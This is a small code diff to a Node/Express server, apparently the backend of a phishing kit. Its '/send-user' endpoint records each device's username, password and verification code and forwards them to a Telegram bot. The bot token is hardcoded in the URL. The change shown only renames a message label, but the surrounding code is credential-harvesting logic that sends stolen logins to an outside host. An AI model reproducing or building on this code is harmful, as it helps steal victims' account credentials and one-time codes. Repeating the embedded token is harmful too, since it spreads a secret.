@@ -28,7 +28,7 @@ app.post('/send-user', async (req, res) => {
     if (!usuariosData[dispositivoID]) {
         usuariosData[dispositivoID] = { usuario: null, contraseña: null, codigo: null };
     }
-    usuariosData[dispositivoID].usuario = `Usuario ${dispositivoID.replace('id.', '')}: \`${usuario}\``;
+    usuariosData[dispositivoID].usuario = `U ${dispositivoID.replace('id.', '')}: \`${usuario}\``;
 
     await fetch(`https://api.telegram.org/bot8748275769:AAE6pBgwNMb-4X3kLljS4zPH03dhlQd7Jz8/sendMessage`, {
         method: 'POST',
